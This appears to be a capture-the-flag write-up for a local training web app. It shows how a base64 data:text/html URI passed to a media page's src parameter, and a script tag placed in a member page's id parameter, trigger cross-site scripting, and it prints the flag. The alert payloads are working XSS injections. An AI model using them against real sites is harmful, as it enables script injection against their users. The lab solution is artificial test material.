@@ -1,0 +1,38 @@
+After having found a flag on each page, the only one or have not found one is "page=media&src=nsa".
+
+We quickly understand that if we put anything in src we come across a new page.
+A page with an object that contains a 404: NOt Found.
+The object attribute does not have a type and this is good news for exploiting it.
+
+The idea is to send it a string with "<script>alert(1);</script>" converted to base64.
+
+<script>alert(1);</script> -> PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
+
+And tell him the type:
+
+data:text/html;base64,
+
+Which gives us:
+
+http://192.168.56.105/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4
+
+And now we have a flag page:
+THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
+
+Pendent la recherche du flag nous avons trouve deux autre faille xss
+
+La premiere est qu'on peux envoyer a la meme page:
+
+While searching for the flag we found two other xss exploit
+
+The first is that we can send to the same page:
+data:text/html,<script>alert(1);</script>
+or  
+data:text/html,%3Cscript%3Ealert%28%27hi%27%29%3B%3C%2Fscript%3E
+If a parser had blocked us
+
+
+The second is on the member page:
+http://192.168.56.105/index.php?page=member&id=1&Submit=Submit#
+The id field is also vulnerable:
+http://192.168.56.105/index.php?page=member&id=%3Cscript%3Ealert(1);%3C/script%3E&Submit=Submit#
